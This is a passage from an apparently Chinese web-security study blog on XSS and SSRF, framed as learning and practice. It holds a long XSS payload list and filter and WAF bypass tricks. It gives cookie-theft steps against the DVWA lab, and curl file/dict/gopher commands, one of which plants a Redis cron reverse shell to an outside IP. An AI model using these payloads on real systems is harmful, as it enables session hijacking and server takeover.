<p>· 演示范例：<a target="_blank" rel="noopener" href="https://blog.csdn.net/vodkaDL/article/details/111570321">Web渗透测试之XSS攻击：基于DOM的XSS</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/p/12542695.html">DOM-XSS攻击原理与防御</a></p>
<h3 id="3、常用XSS语句"><a href="#3、常用XSS语句" class="headerlink" title="3、常用XSS语句"></a>3、常用XSS语句</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xfbk/p/17936998">XSS注入测试思路+通用语句</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;alert(<span class="hljs-string">&#x27;hello，gaga!&#x27;</span>);&lt;/script&gt; //经典语句!<br> <br>&gt;<span class="hljs-string">&quot;&#x27;&gt;&lt;img src=&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&gt;&quot;</span><span class="hljs-string">&#x27;&gt;&lt;script&gt;alert(&#x27;</span>XSS<span class="hljs-string">&#x27;)&lt;/script&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;table background=&#x27;</span>javascript.:alert(([code])&#x27;&gt;&lt;/table&gt;<br> <br>&lt;object type=text/html data=&#x27;javascript.:alert(([code]);&#x27;&gt;&lt;/object&gt;<br> <br>&quot;+alert(&#x27;XSS&#x27;)+&quot;<br> <br>&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br> <br>=&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br> <br>&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br> <br>&lt;script&gt;alert(vulnerable)&lt;/script&gt;<br> <br>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;<br> <br>&lt;img src=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp<br> <br>%<span class="hljs-number">3</span>c/a%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>cscript%<span class="hljs-number">3</span>ealert(%<span class="hljs-number">22</span>xss%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>c/script%<span class="hljs-number">3</span>e<br> <br>%<span class="hljs-number">3</span>c/title%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>cscript%<span class="hljs-number">3</span>ealert(%<span class="hljs-number">22</span>xss%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>c/script%<span class="hljs-number">3</span>e<br> <br>%<span class="hljs-number">3</span>cscript%<span class="hljs-number">3</span>ealert(%<span class="hljs-number">22</span>xss%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>c/script%<span class="hljs-number">3</span>e/index.html<br> <br>&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br> <br>a.jsp/&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br> <br>&quot;&gt;&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br> <br>&lt;IMG SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IMG src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;<br> <br>&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&#x27;XSS&#x27;)&gt;<br> <br>&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&quot;XSS&quot;)&gt;<br> <br>&lt;IMG SRC=&quot;jav    ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IMG SRC=&quot;jav<br>ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IMG SRC=&quot;jav<br>ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&quot;&lt;IMG src=&quot;/java&quot;\<span class="hljs-number">0</span>script.:alert(\&quot;XSS\&quot;)&gt;&quot;;&#x27;&gt;out<br> <br>&lt;IMG SRC=&quot; javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;<br> <br>&lt;BODY BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;<br> <br>&lt;IMG DYNSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>&lt;IMG LOWSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>&lt;BGSOUND SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;br size=&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;&quot;&gt;<br> <br>&lt;LAYER SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;<br> <br>&lt;LINK REL=&quot;stylesheet&quot;HREF=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IMG SRC=&#x27;vbscript.:msgbox(&quot;XSS&quot;)&#x27;&gt;<br> <br>&lt;META. HTTP-EQUIV=&quot;refresh&quot;CONTENT=&quot;<span class="hljs-number">0</span>;url=javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IFRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/IFRAME&gt;<br> <br>&lt;FRAMESET&gt;&lt;FRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;<br> <br>&lt;TABLE BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>&lt;DIV STYLE=&quot;background-image: url(javascript.:alert(&#x27;XSS&#x27;))<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;DIV STYLE=&quot;</span>behaviour: url(<span class="hljs-string">&#x27;http://www.how-to-hack.org/exploit.html&#x27;</span>);<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;DIV STYLE=&quot;</span>width: expression(alert(<span class="hljs-string">&#x27;XSS&#x27;</span>));<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;STYLE&gt;@im\port&#x27;\ja\vasc\ript:alert(&quot;</span>XSS<span class="hljs-string">&quot;)&#x27;;&lt;/STYLE&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;IMG STYLE=&#x27;xss:expre\ssion(alert(&quot;</span>XSS<span class="hljs-string">&quot;))&#x27;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;STYLE. TYPE=&quot;</span>text/javascript<span class="hljs-string">&quot;&gt;alert(&#x27;XSS&#x27;);&lt;/STYLE&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;STYLE. TYPE=&quot;</span>text/css<span class="hljs-string">&quot;&gt;.XSS&#123;background-image:url(&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;STYLE. type=&quot;</span>text/css<span class="hljs-string">&quot;&gt;BODY&#123;background:url(&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;BASE HREF=&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);//<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">getURL(&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">a=&quot;</span>get<span class="hljs-string">&quot;;b=&quot;</span>URL<span class="hljs-string">&quot;;c=&quot;</span>javascript.:<span class="hljs-string">&quot;;d=&quot;</span>alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);<span class="hljs-string">&quot;;eval(a+b+c+d);</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;XML SRC=&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&quot;</span>&gt; &lt;BODY NLOAD=<span class="hljs-string">&quot;a();&quot;</span>&gt;&lt;SCRIPT&gt;<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">a</span></span>()&#123;alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);&#125;&lt;/SCRIPT&gt;&lt;<span class="hljs-string">&quot;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT. SRC=&quot;</span>http://xss.ha.ckers.org/xss.jpg<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;IMG SRC=&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT. a=&quot;</span>&gt;<span class="hljs-string">&quot;SRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT.=&quot;</span>&gt;<span class="hljs-string">&quot;SRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT. a=&quot;</span>&gt;<span class="hljs-string">&quot;&#x27;&#x27;SRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT.&quot;</span>a=<span class="hljs-string">&#x27;&gt;&#x27;</span><span class="hljs-string">&quot;SRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT&gt;document.write(&quot;</span>&lt;SCRI<span class="hljs-string">&quot;);&lt;/SCRIPT&gt;PTSRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;A HREF=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="4、XSS防御"><a href="#4、XSS防御" class="headerlink" title="4、XSS防御"></a>4、XSS防御</h3><ul>
<li><strong>验证</strong></li>
</ul>
<p><strong>思路：</strong>过滤用户输入，使浏览器解释代码而非恶意命令。其中，最重要的是过滤和净化有害的输入，如常见的敏感字符<code>&lt;&gt; &#39; &quot; &amp; # javascript</code>等。</p>
<ul>
<li><strong>编码</strong></li>
</ul>
<p><strong>思路：</strong>转义用户输入，使得浏览器仅解释数据而非代码。</p>
<blockquote>
<p>HTML编码在防止XSS攻击上起到很大的作用，它主要是用对应的HTML实体替代字符，这样做可确保浏览器安全处理可能存在的恶意字符，将其当作HTML文档的内容而非结构加以处理。</p>
<p>一些常见的可能造成问题的字符的HTML编码如下所示：</p>
<p><code>显示</code>		<code>实体名字</code>		<code>实体编号</code></p>
<p><code>&lt;</code>			<code>&amp;lt;</code>			<code>&amp;#60;</code></p>
<p><code>&gt;</code>			<code>&amp;gt;</code>			<code>&amp;#62;</code></p>
<p><code>&amp;</code>			<code>&amp;amp;</code>		   <code>&amp;#38;</code></p>
<p><code>&quot;</code>			<code>&amp;quot;</code>		 <code>&amp;#34;</code></p>
</blockquote>
<ul>
<li><strong>XSS Filter（自编写脚本啦）</strong></li>
</ul>
<p>XSS Filter是防御跨站脚本攻击的主要手段之一，其作用是过滤用户（客户端）提交的有害信息，从而达到防范XSS攻击的效果。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38118138/article/details/118081903">XSS过滤器Filter实现全过程</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Code_shadow/article/details/103125060">使用Filter进行XSS过滤</a></p>
<h3 id="5、XSS绕过"><a href="#5、XSS绕过" class="headerlink" title="5、XSS绕过"></a>5、XSS绕过</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>HTML对标签大小写不敏感，可以利用大小写混用绕过。</p>
<p>例如：<script>改为<ScRiPt></p>
<h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>有些情况下的规则会将黑名单标签替换为空，可以利用这一点构造标签。</p>
<p>例如：<script>改为<scr<script>ipt></p>
<p>同理，某些注释符在规则中也会替换为空，这时候可以利用它构造payload。</p>
<p>例如：<script>改为<scr<!---test--->ipt></p>
<h4 id="开口标签"><a href="#开口标签" class="headerlink" title="开口标签"></a>开口标签</h4><p>在某些特殊环境，由于html代码的补全机制，可以故意<code>不闭合标签</code>绕过黑名单检测例如：<script>改为<script</p>
<h4 id="空格回车Tab"><a href="#空格回车Tab" class="headerlink" title="空格回车Tab"></a>空格回车Tab</h4><p>例如：js伪协议<code>javascript:alert(&#39;xss&#39;);</code>可以改为<code>java script:alert(&#39;xss&#39;);</code>等</p>
<h4 id="编码转义"><a href="#编码转义" class="headerlink" title="编码转义"></a>编码转义</h4><p>JavaScript是很灵活的语言，可以使用十六进制、Unicode、HTML等进行编码，以下属性可以被编码。</p>
<blockquote>
<p>href、action、formaction、location、on*、name、background、poster</p>
</blockquote>
<h4 id="绕Waf"><a href="#绕Waf" class="headerlink" title="绕Waf"></a>绕Waf</h4><p>在url上添加代码：<code>&lt;Script sRC=&#39;//xxx/xx&#39;#ewqeqweq</code>，其中，空格可以使用<code>+</code>，其它的如果需要转义的话自行百度查询吧。</p>
<h4 id="使用其它标签（Waf）"><a href="#使用其它标签（Waf）" class="headerlink" title="使用其它标签（Waf）"></a>使用其它标签（Waf）</h4><blockquote>
<p><code>&lt;svg/onload = alert(1);&gt;</code></p>
</blockquote>
<h3 id="6、伪造身份登陆（XSS获取cookie并利用）"><a href="#6、伪造身份登陆（XSS获取cookie并利用）" class="headerlink" title="6、伪造身份登陆（XSS获取cookie并利用）"></a>6、伪造身份登陆（XSS获取cookie并利用）</h3><blockquote>
<p>实现流程：</p>
<p>1、注册一个在线xss平台账号，<a target="_blank" rel="noopener" href="https://xss.yt/">https://xss.yt</a></p>
<p>2、创建项目，获取自己对应的XSS payload（其中的项目名称和项目描述随便写）</p>
<p>3、选择默认模块，默认模块是读取cookie，下一步。（可以选择超强默认模块啦，无需配置keepsession）</p>
<p>4、然后就会出现一些可植入js代码（可利用）</p>
<p>5、然后，使用浏览器打开dvwa靶场，将安全级别调到low。选择反射性xss，将上面的js代码复制一个到输入框中，进行测试。</p>
<p>6、回到xss平台，查看内容。展开，会发现登陆用的cookie</p>
<p>7、获取到cookie后，打开另外一个浏览器访问dvwa(模拟攻击者操作)，f12打开开发者工具，在”存储“中找到cookie值，记录其<code>PHPSESSION</code>值</p>
<p>8、将之前获取到的cookie值替换上去，把security的impossible改为low,回到登录界面，在url后面加上获取到的cookie信息（cookie=security=low; PHPSESSION=记下的内容）。ps：url改为后台地址（cookie下的url地址）</p>
</blockquote>
<h2 id="③SSRF服务器端请求伪造"><a href="#③SSRF服务器端请求伪造" class="headerlink" title="③SSRF服务器端请求伪造"></a>③SSRF服务器端请求伪造</h2><h3 id="1、漏洞简介-1"><a href="#1、漏洞简介-1" class="headerlink" title="1、漏洞简介"></a>1、漏洞简介</h3><p>· SSRF，服务器端请求伪造，是由攻击者构造请求，但由服务端发起请求的安全漏洞。本质上属于信息泄露漏洞。</p>
<p>· SSRF攻击的目标是：<code>从外网无法访问的内部系统</code>。（因为其由服务器端发起，所以它能够请求到与它相连而与外网隔离的内部系统，也就是把目标网站当作中间人）</p>
<p>· SSRF 形成的原因：<code>大都是由于服务器提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤和限制 </code>。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。</p>
<p>· 数据流：<code>攻击者</code>----<code>服务器</code>----<code>目标地址</code></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/miruier/p/13907150.html">SSRF漏洞（原理、挖掘点、漏洞利用、修复建议）</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114626708">SSRF (服务器端请求伪造) 漏洞原理与利用方式</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/333318.html">从0到1完全掌握 SSRF-有面试相关内容</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43378996/article/details/124050308">SSRF漏洞原理攻击与防御-协议方面比较完善</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/365150.html">手把手用实战教你SSRF漏洞从入门到精通</a></p>
</blockquote>
<h3 id="2、漏洞产生"><a href="#2、漏洞产生" class="headerlink" title="2、漏洞产生"></a>2、漏洞产生</h3><h4 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h4><p>php中的以下函数使用不当容易导致SSRF：</p>
<ul>
<li><strong>file_get_contents()和readfile()</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>	// 传入URL地址<br>	<span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];   <br>	// 从URL地址中读取指定内容，并直接输出<br>	<span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-variable">$url</span>);  <br>?&gt;<br></code></pre></td></tr></table></figure>

<blockquote>
<p><code>file_get_content</code>函数从用户指定的url读取整个文件内容，然后直接使用echo命令输出展现给用户。</p>
<p>file_put_content()函数的作用是读取文件内容或者URL地址指定的内容。</p>
<p>！当传入的参数是内网文件的路径时（如在原url上添加构造路径<code>ssrf.php?url=../../../../../../etc/passwd</code>），就会造成文件读取，信息泄露 。一般这种攻击与目录遍历相结合。</p>
</blockquote>
<ul>
<li><strong>fsockopen()</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br><span class="hljs-keyword">function</span> GetFile(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span>) &#123; <br>    <span class="hljs-variable">$fp</span> = fsockopen(<span class="hljs-variable">$host</span>, intval(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, 30);   <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$errstr</span> (error number <span class="hljs-variable">$errno</span>) \n&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-variable">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-variable">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        fwrite(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!feof(<span class="hljs-variable">$fp</span>)) &#123; <br>            <span class="hljs-variable">$contents</span>.= fgets(<span class="hljs-variable">$fp</span>, 1024); <br>        &#125; <br>        fclose(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-built_in">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>

<blockquote>
<p><code>fsockopen</code>函数主要实现：初始化一个套接字连接到指定主机（host）实现对用户指定url数据的获取。该函数使用socket（端口）跟服务器建立tcp连接，传输数据。</p>
<p><code>fsockopen</code>函数将返回一个句柄，该句柄之后可以被其它文件类函数调用（例如，fgets()、fgetss()、fwrite()、fclose()、feof()，如果调用失败，则返回false）</p>
<p>变量host为指定主机名，port为端口（主要根据服务而定），errstr表示错误信息将以字符串的信息返回，30为时限。</p>
<p>同样也是添加构造语句<code>ssrf.php?url=www.baidu.com(域名)</code>即可成功触发ssrf，并返回目标域名主页。用处不算大。</p>
</blockquote>
<ul>
<li><strong>curl_exec()</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$curlobj</span> = curl_init();// 创建新的 cURL 资源<br>    curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, 0);<br>    curl_setopt(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);<br>    curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项<br>    <span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$curlobj</span>);// 抓取 URL 并把它传递给浏览器<br>    curl_close(<span class="hljs-variable">$curlobj</span>);// 关闭 cURL 资源，并且释放系统资源<br><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./curled/&#x27;</span>.rand().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>    file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$result</span>); <br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>

<blockquote>
<p><code>curl_exec</code>函数用于执行指定的cURL会话。cURL通过PHP获取数据，并将获取到的文件数据保存至curled文件夹下的随机文件名文本文件中。</p>
<p>对于<code>curl_exec</code>的攻击方式：</p>
<ul>
<li>可以通过添加构造语句<code>ssrf.php?url=www.baidu.com(域名)</code>触发其ssrf</li>
<li>通过<code>file、dict、gopher</code>这三个协议来进行渗透。（更常见的做法）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -vvv <span class="hljs-string">&#x27;file:///etc/passwd&#x27;</span> <br>curl -vvv <span class="hljs-string">&#x27;dict://127.0.0.1:6379/info&#x27;</span> <br><span class="hljs-comment"># 注意：链接使用单引号，避免$变量问题 </span><br>curl -vvv <span class="hljs-string">&#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span><br></code></pre></td></tr></table></figure>

<p>其中，<code>curl</code> 是一个命令行工具，用于发送和接收数据，通常用于与网页和服务器进行交互。</p>
<p><code>-vvv</code> 参数表示输出详细的调试信息，有助于查看命令的执行过程和返回结果</p>
<p><code>dict://127.0.0.1:6379/info</code>指定使用dict协议，来模拟一个访问Redis服务的请求，后面的IP和端口号指的是本地主机地址和Redis默认的监听端口号，<code>/info</code>用于获取Redis服务器的信息和统计数据（Redis常用命令）</p>
<p><code>gopher</code> 是一种互联网协议，它允许通过 URL 方式进行数据传输。这里的<code>gopher://127.0.0.1:6379/</code> 指定了一个 Redis 服务器的地址和端口号。</p>
<p>接下来是一系列以 <code>%0d%0a</code> 结尾的数据块，这些块构成了一个特定的Redis命令序列。</p>
<p>有关于上述对gopher协议的利用代码主要利用了Redis未授权访问漏洞，时期允许攻击者执行任意命令，包括执行恶意代码。</p>
</blockquote>
<ul>
<li><strong>SoapClient类</strong></li>
</ul>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37376469/article/details/130024611">PHP中原生类SoapClient反序列化的SSRF利用</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/100569464">利用SoapClient类进行SSRF+CRLF攻击</a></p>
<blockquote>
<p>注意情况：</p>
<p>1.一般情况下PHP不会开启fopen的gopher wrapper </p>
<p>2.file_get_contents的gopher协议不能URL编码 </p>
<p>3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败 </p>
<p>4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用 </p>
<p>5.curl_exec() //默认不跟踪跳转</p>
